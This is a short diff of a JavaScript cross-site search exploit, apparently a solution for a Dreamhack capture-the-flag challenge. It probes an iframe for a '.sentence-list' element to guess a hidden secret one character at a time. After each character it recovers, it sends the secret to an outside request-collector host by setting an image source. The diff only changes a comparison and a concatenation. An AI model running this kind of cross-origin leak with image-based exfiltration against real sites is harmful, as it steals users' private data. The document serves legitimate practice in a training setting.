@@ -6,7 +6,7 @@
             const iframe = document.getElementById("iframe");
             iframe.src = url;
             iframe.onload = () => { 
-                if (iframe.contentDocument.querySelector('.sentence-list'))
+                if (iframe.contentDocument.querySelector('.sentence-list') != 0)
                     return resolve();
                 else
                     return reject();
@@ -29,7 +29,7 @@
         while (!secret.includes("}")) {
             for (let c of chars) {
                 if (await search(secret + c)) {
-                    secret = secret + c;
+                    secret += c;
                     img.src = `https://qpmskgn.request.dreamhack.games/${secret}`;
                     break;
                 }
